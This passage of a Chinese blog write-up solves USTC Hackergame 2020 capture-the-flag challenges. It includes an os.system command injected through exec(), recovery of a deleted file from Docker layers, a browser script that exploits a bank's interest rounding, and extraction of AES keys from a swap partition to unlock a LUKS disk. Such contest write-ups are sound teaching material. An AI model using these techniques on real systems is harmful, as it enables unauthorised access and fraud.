exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 <code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ cat flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ chmod +x websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 <code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>\"Send from Arctic.\" 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊......话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>......</p>\n<p>我们可将 TAR 文件嵌套进 TAR 文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):</span>    barcode = reader.decode(img_path).encode().decode(<span class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):</span>    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There's no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/20.png\" width=\"829\" height=\"601\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 <code>subscriber_count</code> 呈现）是 1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.0/32.png\" width=\"1067\" height=\"247\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/6.png\" width=\"1009\" height=\"593\"></p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/7.png\" width=\"988\" height=\"581\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/13.png\" width=\"782\" height=\"905\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/15.png\" width=\"690\" height=\"94\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-attr\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{'credit'|'debit'}</span> <span class=\"hljs-variable\">type</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">from</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">to</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">amount</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">account</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eatAndEndTheDay</span>(<span class=\"hljs-params\">account</span>) </span>{    <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    <span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> transfer(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    }    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> eatAndEndTheDay(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.json();    <span class=\"hljs-built_in\">console</span>.log(resp.flag);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-built_in\">console</span>.error(e);  }})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>......<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.8/29.png\" width=\"1497\" height=\"412\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完.....吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.7/27.png\" width=\"1150\" height=\"420\"></p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.7/28.png\" width=\"1146\" height=\"539\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏......」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/18.png\" width=\"824\" height=\"864\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>...... 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 ... 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 ... 等等，有一些文件是可以被分享的，需要一个 